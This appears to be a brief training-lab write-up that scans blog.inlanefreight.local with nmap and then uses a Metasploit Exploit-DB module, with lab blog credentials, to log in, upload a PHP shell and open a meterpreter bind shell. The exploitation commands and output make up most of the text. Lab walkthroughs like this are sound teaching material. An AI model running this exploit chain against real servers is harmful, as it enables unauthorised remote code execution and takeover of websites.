### Domain
blog.inlanefreight.local

### Nmap

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -p 22,80 -sVC 172.16.1.12
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-18 04:32 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.0096s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

### HTTP
Going to blog.inlanefreight.local we can check the blog, even in there we can find an exploit referenced so lets use this exploit. Looking the exploit db we can see that is a metasploit module so after locate it in the system lets run it

```bash
msf6 > use exploits/50064.rb
[*] Using configured payload php/meterpreter/bind_tcp
msf6 exploit(50064) > options

Module options (exploit/50064):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin123!@#      yes       Blog password
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS     172.16.1.12      yes       The target host(s), range CIDR identi
                                         fier, or hosts file with syntax 'file
                                         :<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       The URI of the arkei gate
   USERNAME   admin            yes       Blog username
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  172.16.1.12      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP payload

msf6 exploit(50064) > run

[*] Got CSRF token: 36f96542e0
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/49Gw.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2023-07-18 05:58:36 -0400

meterpreter >
```

And we are in

